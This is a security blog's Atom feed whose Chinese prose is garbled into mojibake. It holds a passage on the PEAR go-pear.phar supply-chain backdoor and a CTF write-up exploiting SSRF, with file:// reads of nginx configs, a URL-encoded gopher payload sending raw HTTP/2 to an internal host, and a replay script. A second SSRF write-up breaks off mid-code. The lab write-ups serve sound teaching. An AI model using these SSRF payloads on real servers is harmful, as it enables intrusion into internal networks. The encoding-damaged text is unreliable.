æ­¤æ‰€æœ‰åœ¨è¿‡å»å…­ä¸ªæœˆå†…ä»å®˜æ–¹ç½‘ç«™ä¸‹è½½è¿‡å®‰è£…æ–‡ä»¶<code>go-pear.phar</code>çš„PHP / PEARç”¨æˆ·<strong>éƒ½åº”è¯¥è®¤è¯†</strong>åˆ°è‡ªå·±æœ‰è¢«é»‘å®¢ä¾µå®³çš„é£é™©ï¼Œå¹¶ä¸”æœ€å¥½æ›¿æ¢æ–‡ä»¶ä¸ºGithubä¸Šçš„çº¯å‡€ç‰ˆæœ¬ã€‚</p><h2 id="PEAR-å›¢é˜Ÿé’ˆå¯¹æ­¤æ¬¡ä¾›åº”é“¾æ±¡æŸ“çš„éƒ¨åˆ†è°ƒæŸ¥ä¿¡æ¯"><a href="#PEAR-å›¢é˜Ÿé’ˆå¯¹æ­¤æ¬¡ä¾›åº”é“¾æ±¡æŸ“çš„éƒ¨åˆ†è°ƒæŸ¥ä¿¡æ¯" class="headerlink" title="PEAR å›¢é˜Ÿé’ˆå¯¹æ­¤æ¬¡ä¾›åº”é“¾æ±¡æŸ“çš„éƒ¨åˆ†è°ƒæŸ¥ä¿¡æ¯"></a>PEAR å›¢é˜Ÿé’ˆå¯¹æ­¤æ¬¡ä¾›åº”é“¾æ±¡æŸ“çš„éƒ¨åˆ†è°ƒæŸ¥ä¿¡æ¯</h2><p><strong>æ›´æ–°</strong> -  PEARå›¢é˜Ÿå‘å¸ƒäº†æœ‰å…³æœ€è¿‘å®‰å…¨äº‹ä»¶çš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè§£é‡Šäº†åœ¨2018å¹´12æœˆ20æ—¥æœ€åä¸€æ¬¡æ­£å¼æ–‡ä»¶å‘å¸ƒåï¼Œå…¶æœåŠ¡å™¨ä¸Šå‘ç°<code>go-pear.phar</code>è¢«æ±¡æŸ“çš„è¯¦ç»†çŠ¶å†µã€‚</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190130111806.png" alt=""></p><p>PEAR å›¢é˜Ÿåœ¨åˆ†æäº†åŒ…ç®¡ç†å™¨çš„æ±¡æŸ“ç‰ˆæœ¬æ–‡ä»¶ä¹‹åï¼Œå‘ç°æ¶æ„ä»£ç æ¨¡å—<code>é€šè¿‡Perlå‘IP 104.131.154.154ç”Ÿæˆåå‘shell</code>ï¼Œè¿™æ„å‘³ç€å—æ„ŸæŸ“çš„æœåŠ¡å™¨å°†ç”Ÿæˆåé—¨ï¼Œå…è®¸æ”»å‡»è€…å®Œå…¨æ§åˆ¶å®ƒä»¬ï¼ŒåŒ…æ‹¬å®‰è£…åº”ç”¨ç¨‹åºï¼Œè¿è¡Œæ¶æ„ä»£ç ï¼Œçªƒå–æ•æ„Ÿæ•°æ®çš„èƒ½åŠ›ã€‚</p><p>æ ¹æ®<a href="https://blog.dcso.de/php-pear-software-supply-chain-attack/" target="_blank" rel="noopener">DCSOä¸Šå¾·å›½ç½‘ç»œå®‰å…¨ç»„ç»‡å¯¹æ­¤æ¬¡ä¾›åº”é“¾æ±¡æŸ“çš„åˆ†ææŠ¥å‘Š</a>å¾—çŸ¥ï¼šæœåŠ¡å™¨IPåœ°å€<code>104.131.154.154</code>æŒ‡å‘ä¸€ä¸ªwebåŸŸå<code>bestlinuxgames [.] com</code>ï¼Œè¯¥æœåŠ¡å™¨è¢«è®¤ä¸ºæ˜¯é»‘å®¢ä½¿ç”¨çš„ä¸€å°å—æ„ŸæŸ“åä¸»æœºï¼ˆè‚‰é¸¡/C2æœåŠ¡å™¨ï¼‰ã€‚</p><blockquote><p>â€œè¯¥IPå·²è¢«è¯å®ä¸æ­¤æ¬¡ä¾›åº”é“¾æ±¡æŸ“æœ‰å…³ï¼Œä½†æ²¡æœ‰å‘ç°å…¶ä»–è¿è§„è¡Œä¸ºã€‚<code>install-pear-nozlib.phar</code>è½¯ä»¶åŒ…æ˜¯æ­£å¸¸çš„ï¼ŒGitHubä¸Šçš„<code>go-pear.phar</code>æ–‡ä»¶ä¹Ÿæ˜¯æ­£å¸¸çš„ï¼Œå¯ä»¥å°†ä»»ä½•å¯ç–‘çš„æ ·æœ¬å“ˆå¸Œä¸æ­£ç¡®çš„MD5å€¼è¿›è¡Œæ ¡éªŒã€‚â€ï¼›</p><p>â€œå› æ­¤ï¼Œå‡å¦‚æ‚¨åœ¨12/20ä¹‹å‰ä¸‹è½½äº†<code>go-pear.phar</code>ç”¨ä»¥åœ¨æ‚¨çš„ç³»ç»Ÿä¸Šå®‰è£…PEARåŒ…ï¼Œé‚£ä¹ˆæ‚¨<strong>åº”è¯¥æ‹…å¿ƒ</strong>è‡ªå·±æ˜¯å¦ä¼šæˆä¸ºè‚‰é¸¡ï¼Œç‰¹åˆ«æ˜¯å½“æ‚¨çš„ç³»ç»Ÿå…·æœ‰å¯ç”¨çš„<code>sh</code>å’Œ<code>perl</code>çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰å…·ä½“è¯æ®å»ç¡®è®¤æ‚¨æ˜¯å¦ä¸‹è½½äº†è¢«æ„ŸæŸ“çš„æ–‡ä»¶ï¼Œä½†ä¿é™©èµ·è§è¿˜æ˜¯å¸Œæœ›æ‚¨èƒ½å¥½å¥½æ£€æŸ¥ä¸€ä¸‹æ‚¨çš„ç³»ç»Ÿã€‚â€ï¼›</p><p>â€œå¦å¤–è¿˜éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ä¼šæ±¡æŸ“ä½¿ç”¨PEARå®‰è£…çš„ç¨‹åºåŒ…â€¦å®ƒæ±¡æŸ“çš„æ˜¯åˆå§‹å®‰è£…PEARå®‰è£…ç¨‹åºçš„<code>go-pear.phar</code>å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå³ä½¿ç”¨<code>pear</code>å‘½ä»¤å®‰è£…çš„å„ç§PEARåŒ…<strong>ä¸å—</strong>å½±å“ã€‚â€ï¼›</p><p>PEAR å›¢é˜Ÿåœ¨ä¸€ç³»åˆ—æ¨æ–‡ä¸­çš„è¡¨ç¤ºå¦‚ä¸Šã€‚</p></blockquote><p>PSï¼šå½“ä»Šçš„ä¾›åº”é“¾æ±¡æŸ“äº‹ä»¶è¶Šæ¥è¶Šå¤šï¼Œè°¨æ…å°å¿ƒæ–¹èƒ½é©¶å¾—ä¸‡å¹´èˆ¹ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;â€¦â€¦&lt;/p&gt;
    
    </summary>
    
      <category term="è¯‘æ–‡" scheme="http://www.yof3ng.xyz/categories/%E8%AF%91%E6%96%87/"/>
    
    
      <category term="èµ„è®¯" scheme="http://www.yof3ng.xyz/tags/%E8%B5%84%E8%AE%AF/"/>
    
      <category term="è¯‘æ–‡" scheme="http://www.yof3ng.xyz/tags/%E8%AF%91%E6%96%87/"/>
    
      <category term="ç½‘ç»œå®‰å…¨" scheme="http://www.yof3ng.xyz/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>ssrf_by_http2_and_gopher</title>
    <link href="http://www.yof3ng.xyz/2019/01/31/ssrf-by-http2-and-gopher/"/>
    <id>http://www.yof3ng.xyz/2019/01/31/ssrf-by-http2-and-gopher/</id>
    <published>2019-01-31T09:05:24.000Z</published>
    <updated>2019-04-02T08:46:31.127Z</updated>
    
    <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="pwnhub-pink-friend"><a href="#pwnhub-pink-friend" class="headerlink" title="pwnhub-pink-friend"></a>pwnhub-pink-friend</h1><blockquote><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="http://f1sh.site/2019/01/30/pwnhub-pink-friend-writeup/" target="_blank" rel="noopener">http://f1sh.site/2019/01/30/pwnhub-pink-friend-writeup/</a></p><p><a href="https://www.virzz.com/2019/01/29/pwnhub_2019_pink_friend_http2.html" target="_blank" rel="noopener">https://www.virzz.com/2019/01/29/pwnhub_2019_pink_friend_http2.html</a></p></blockquote><p>é¢˜ç›®é“¾æ¥ï¼š<a href="https://40.73.33.181/index.php" target="_blank" rel="noopener">https://40.73.33.181/index.php</a></p><p>source code:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Can not parse url: '</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span> <span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>å…ˆssrfè¯»nginxé…ç½®æ–‡ä»¶ï¼š</p><ul><li>/etc/nginx/nginx.conf</li><li>/etc/nginx/sites-enabled/default</li><li>/var/log/nginx/access.log;</li><li>/var/log/nginx/error.log</li></ul><p><code>view-source:https://40.73.33.181/index.php?url=file:///etc/nginx/sites-enabled/default</code></p><p><code>view-source:https://40.73.33.181/index.php?url=file:///etc/nginx/nginx.conf</code></p><pre class=" language-nginx"><code class="language-nginx"><span class="token keyword">user</span> www<span class="token operator">-</span>data<span class="token punctuation">;</span><span class="token keyword">worker_processes</span> auto<span class="token punctuation">;</span><span class="token keyword">pid</span> <span class="token operator">/</span>run<span class="token operator">/</span>nginx<span class="token punctuation">.</span><span class="token keyword">pid</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>modules<span class="token operator">-</span>enabled<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">.</span>conf<span class="token punctuation">;</span><span class="token keyword">events</span> <span class="token punctuation">{</span>    <span class="token keyword">worker_connections</span> <span class="token number">768</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># multi_accept on;</span><span class="token punctuation">}</span><span class="token keyword">http</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># Basic Settings</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">sendfile</span> on<span class="token punctuation">;</span>    <span class="token keyword">tcp_nopush</span> on<span class="token punctuation">;</span>    <span class="token keyword">tcp_nodelay</span> on<span class="token punctuation">;</span>    <span class="token keyword">keepalive_timeout</span> <span class="token number">65</span><span class="token punctuation">;</span>    <span class="token keyword">types_hash_max_size</span> <span class="token number">2048</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># server_tokens off;</span>    <span class="token comment" spellcheck="true"># server_names_hash_bucket_size 64;</span>    <span class="token comment" spellcheck="true"># server_name_in_redirect off;</span>    <span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>mime<span class="token punctuation">.</span><span class="token keyword">types</span><span class="token punctuation">;</span>    <span class="token keyword">default_type</span> application<span class="token operator">/</span>octet<span class="token operator">-</span>stream<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># SSL Settings</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">ssl_protocols</span> TLSv1 TLSv1<span class="token number">.1</span> TLSv1<span class="token number">.2</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true"># Dropping SSLv3, ref: POODLE</span>    <span class="token keyword">ssl_prefer_server_ciphers</span> on<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># Logging Settings</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">access_log</span> <span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>access<span class="token punctuation">.</span>log<span class="token punctuation">;</span>    <span class="token keyword">error_log</span> <span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>error<span class="token punctuation">.</span>log<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># Gzip Settings</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">gzip</span> on<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># gzip_vary on;</span>    <span class="token comment" spellcheck="true"># gzip_proxied any;</span>    <span class="token comment" spellcheck="true"># gzip_comp_level 6;</span>    <span class="token comment" spellcheck="true"># gzip_buffers 16 8k;</span>    <span class="token comment" spellcheck="true"># gzip_http_version 1.1;</span>    <span class="token comment" spellcheck="true"># gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># Virtual Host Configs</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>conf<span class="token punctuation">.</span>d<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">.</span>conf<span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>sites<span class="token operator">-</span>enabled<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">#server {</span>    <span class="token comment" spellcheck="true">#    listen 8080</span>    <span class="token comment" spellcheck="true">#    location /flag {</span>    <span class="token comment" spellcheck="true">#        proxy_pass 172.20.0.3:8080</span>    <span class="token comment" spellcheck="true">#    }</span>    <span class="token comment" spellcheck="true">#}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#mail {</span><span class="token comment" spellcheck="true">#    # See sample authentication script at:</span><span class="token comment" spellcheck="true">#    # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true">#    # auth_http localhost/auth.php;</span><span class="token comment" spellcheck="true">#    # pop3_capabilities "TOP" "USER";</span><span class="token comment" spellcheck="true">#    # imap_capabilities "IMAP4rev1" "UIDPLUS";</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true">#    server {</span><span class="token comment" spellcheck="true">#        listen     localhost:110;</span><span class="token comment" spellcheck="true">#        protocol   pop3;</span><span class="token comment" spellcheck="true">#        proxy      on;</span><span class="token comment" spellcheck="true">#    }</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true">#    server {</span><span class="token comment" spellcheck="true">#        listen     localhost:143;</span><span class="token comment" spellcheck="true">#        protocol   imap;</span><span class="token comment" spellcheck="true">#        proxy      on;</span><span class="token comment" spellcheck="true">#    }</span><span class="token comment" spellcheck="true">#}</span></code></pre><p>ç„¶åå¯ä»¥ä»nginx.confå¾—çŸ¥flagçº¿ç´¢<code>172.20.0.3:8080</code>ï¼Œé€šè¿‡gopheråè®®æ„é€ ç¬¦åˆHTTP2çš„payloadè®¿é—®æŒ‡å®šåœ°å€ï¼Œè·å–è¿”å›çš„HTTP2çš„åŸç”Ÿæ•°æ®ï¼ˆéœ€è¦äº†è§£<a href="https://www.codercto.com/a/34433.html" target="_blank" rel="noopener">HTTP2</a>ä»¥åŠ<a href="https://www.codercto.com/a/34433.html" target="_blank" rel="noopener">gopheråè®®</a>çš„çŸ¥è¯†ï¼‰ã€‚</p><pre class=" language-payload"><code class="language-payload">--payload:/index.php?url=gopher://172.20.0.3:8080/_PRI%2520%252A%2520HTTP/2.0%250D%250A%250D%250ASM%250D%250A%250D%250A%2500%2500%2500%2504%2500%2500%2500%2500%2500%2500%2500%2515%2501%2505%2500%2500%2500%2501%2582%2586%2584A%258A%2508%259D%255C%250B%2581p%25DCx%250F%2503%2560%2581%25EFS%2581%25F9</code></pre><p>è¿”å›çš„æ•°æ®:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190131000835.png" alt=""></p><p>å¯ä»¥å°†è¿”å›çš„æ•°æ®æŒ‰HTTP2åè®®çš„æ ¼å¼è§£æï¼Œæˆ–è€…åˆ©ç”¨ä¸€ç§å·§å¦™çš„æ–¹æ³•ï¼Œå³æŠŠè¿”å›æ•°æ®æ”¾åœ¨ä½¿ç”¨socketæ¨¡æ‹Ÿçš„æœåŠ¡å™¨ä¸Šï¼Œç›´æ¥ç”¨<code>curl --http2-prior-knowledge</code>è®¿é—®ï¼Œè·å¾—å†™åœ¨è¿”å›å¤´éƒ¨<code>set-cookie</code>çš„flagï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: UTF-8 -*-</span><span class="token comment" spellcheck="true"># From F1sh's blog</span><span class="token keyword">import</span> socketa <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"response.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>host <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span>port <span class="token operator">=</span> <span class="token number">2333</span>s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    c<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">'è¿æ¥åœ°å€ï¼š'</span><span class="token punctuation">,</span> addr    c<span class="token punctuation">.</span>send<span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre><p>æ‰§è¡Œ<code>curl -vv --http2-prior-knowledge 127.0.0.1:6777 --output -</code>è¿”å›çš„æ•°æ®ï¼š</p><pre class=" language-response"><code class="language-response">* Rebuilt URL to: 127.0.0.1:6777/*   Trying 127.0.0.1...* TCP_NODELAY set* Connected to 127.0.0.1 (127.0.0.1) port 6777 (#0)* Using HTTP2, server supports multi-use* Connection state changed (HTTP/2 confirmed)* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0* Using Stream ID: 1 (easy handle 0x55d0f3f35520)> GET / HTTP/2> Host: 127.0.0.1:6777> User-Agent: curl/7.61.0> Accept: */*> * Connection state changed (MAX_CONCURRENT_STREAMS == 128)!< HTTP/2 200 < server: nginx/1.14.0 (Ubuntu)< date: Wed, 30 Jan 2019 16:02:53 GMT< content-type: text/html; charset=UTF-8< set-cookie: F1ag:flag{Http2_Mak3_a_Differ3nce}=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0< * Closing connection 0U hav3 g0t Me!!!%                  </code></pre><p>[+] GET==&gt; F1ag:flag{Http2_Mak3_a_Differ3nce}</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;â€¦â€¦&lt;/p&gt;
    
    </summary>
    
      <category term="ç½‘ç»œå®‰å…¨" scheme="http://www.yof3ng.xyz/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ç½‘ç»œå®‰å…¨" scheme="http://www.yof3ng.xyz/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
      <category term="ssrf" scheme="http://www.yof3ng.xyz/tags/ssrf/"/>
    
      <category term="write-up" scheme="http://www.yof3ng.xyz/tags/write-up/"/>
    
  </entry>
  
  <entry>
    <title>æŸå…¥ç¾¤é¢˜è§£é¢˜è®°å½•</title>
    <link href="http://www.yof3ng.xyz/2019/01/29/%E6%9F%90%E5%85%A5%E7%BE%A4%E9%A2%98%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://www.yof3ng.xyz/2019/01/29/æŸå…¥ç¾¤é¢˜è§£é¢˜è®°å½•/</id>
    <published>2019-01-29T13:58:02.000Z</published>
    <updated>2019-04-02T08:47:14.376Z</updated>
    
    <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="è®°æŸå…¥ç¾¤é¢˜è§£é¢˜è¿‡ç¨‹"><a href="#è®°æŸå…¥ç¾¤é¢˜è§£é¢˜è¿‡ç¨‹" class="headerlink" title="è®°æŸå…¥ç¾¤é¢˜è§£é¢˜è¿‡ç¨‹"></a>è®°æŸå…¥ç¾¤é¢˜è§£é¢˜è¿‡ç¨‹</h1><p>é—²æ¥æ— äº‹ï¼Œçœ‹ä¼—äººçº·çº·åœ¨ç©å…¥ç¾¤é¢˜ï¼Œçºµä½¿æˆ‘èœçš„ä¸æ•¢åŠ¨æ‰‹ï¼Œä¹Ÿæƒ³å°è¯•ä¸€ä¸‹ã€‚</p><h2 id="0x01-è¿é¢è€Œæ¥çš„SSRF"><a href="#0x01-è¿é¢è€Œæ¥çš„SSRF" class="headerlink" title="0x01 è¿é¢è€Œæ¥çš„SSRF"></a>0x01 è¿é¢è€Œæ¥çš„SSRF</h2><p>é¦–å…ˆè®¿é—®é¢˜ç›®åœ°å€ï¼š</p><p><code>index.phpæºç </code></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">check_inner_ip</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$match_result</span><span class="token operator">=</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$match_result</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'url fomat error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">try</span>     <span class="token punctuation">{</span>         <span class="token variable">$url_parse</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">catch</span><span class="token punctuation">(</span>Exception <span class="token variable">$e</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'url fomat error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token variable">$hostname</span><span class="token operator">=</span><span class="token variable">$url_parse</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token variable">$ip</span><span class="token operator">=</span><span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$hostname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$int_ip</span><span class="token operator">=</span><span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string">'127.0.0.0'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">></span><span class="token number">24</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">></span><span class="token operator">></span><span class="token number">24</span> <span class="token operator">||</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string">'10.0.0.0'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">></span><span class="token number">24</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">></span><span class="token operator">></span><span class="token number">24</span> <span class="token operator">||</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string">'172.16.0.0'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">></span><span class="token number">20</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">></span><span class="token operator">></span><span class="token number">20</span> <span class="token operator">||</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string">'192.168.0.0'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">></span><span class="token number">16</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">></span><span class="token operator">></span><span class="token number">16</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">check_inner_ip</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token variable">$url</span><span class="token punctuation">.</span><span class="token string">' is inner ip'</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">else</span>     <span class="token punctuation">{</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$result_info</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result_info</span><span class="token punctuation">[</span><span class="token string">'redirect_url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>         <span class="token punctuation">{</span>             <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$result_info</span><span class="token punctuation">[</span><span class="token string">'redirect_url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token 